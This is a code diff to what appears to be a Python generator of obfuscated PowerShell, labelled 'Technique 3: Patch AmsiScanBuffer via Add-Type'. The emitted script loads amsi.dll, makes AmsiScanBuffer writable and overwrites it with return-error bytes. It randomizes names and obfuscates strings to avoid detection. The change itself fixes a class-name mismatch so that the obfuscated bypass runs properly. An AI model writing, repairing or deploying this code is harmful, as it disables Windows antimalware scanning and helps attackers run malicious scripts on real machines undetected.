@@ -216,12 +216,13 @@ try {{
     # Technique 3: Patch AmsiScanBuffer via Add-Type
     var7 = morph_name('sig')
     var8 = morph_name('amsi')
+    class_name = morph_name('Bypass')
     t3 = f"""
 try {{
     $code = @"
 using System;
 using System.Runtime.InteropServices;
-public class {morph_name('Bypass')} {{
+public class {class_name} {{
     [DllImport({obfuscate_string('kernel32')})]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
     [DllImport({obfuscate_string('kernel32')})]
@@ -231,11 +232,11 @@ public class {morph_name('Bypass')} {{
 }}
 "@
     Add-Type $code
-    $hModule = [Bypass]::LoadLibrary({obfuscate_string('amsi.dll')})
-    $addr = [Bypass]::GetProcAddress($hModule, {obfuscate_string('AmsiScanBuffer')})
+    $hModule = [{class_name}]::LoadLibrary({obfuscate_string('amsi.dll')})
+    $addr = [{class_name}]::GetProcAddress($hModule, {obfuscate_string('AmsiScanBuffer')})
     $buf = [Byte[]] (0xB8,0x57,0x00,0x07,0x80,0xC3)
     $oldProtect = 0
-    [Bypass]::VirtualProtect($addr, [uint32]$buf.Length, 0x40, [ref]$oldProtect)
+    [{class_name}]::VirtualProtect($addr, [uint32]$buf.Length, 0x40, [ref]$oldProtect)
     [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
 }} catch {{}}
 """
